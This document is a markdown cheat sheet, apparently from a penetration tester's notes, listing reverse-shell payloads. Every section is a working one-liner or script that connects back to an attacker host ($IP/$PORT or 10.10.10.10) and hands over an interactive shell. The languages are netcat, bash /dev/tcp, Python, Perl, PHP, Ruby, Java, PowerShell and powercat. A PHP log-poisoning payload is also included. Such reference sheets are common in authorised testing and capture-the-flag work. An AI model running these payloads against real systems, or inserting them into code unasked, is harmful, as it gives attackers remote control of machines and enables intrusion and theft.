# Reverse Shells

## Netcat 

Netcat without -e
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

Netcat with -e
```bash
nc -e /bin/sh 10.10.10.10 1234
```

## Bash

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

## Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

File version
```python
import socket, subprocess,os

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$IP", $PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh", "-i"])
```

## Perl

```perl
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP

```php
php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```


## Log Poisoning PHP
```php
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f') ?>
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Powershell 
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

## Powercat
More Powercat related at [[Powercat-Cheatsheet]]
```powershell
powercat -c 10.10.10.10 -p 54321 -e cmd.exe
```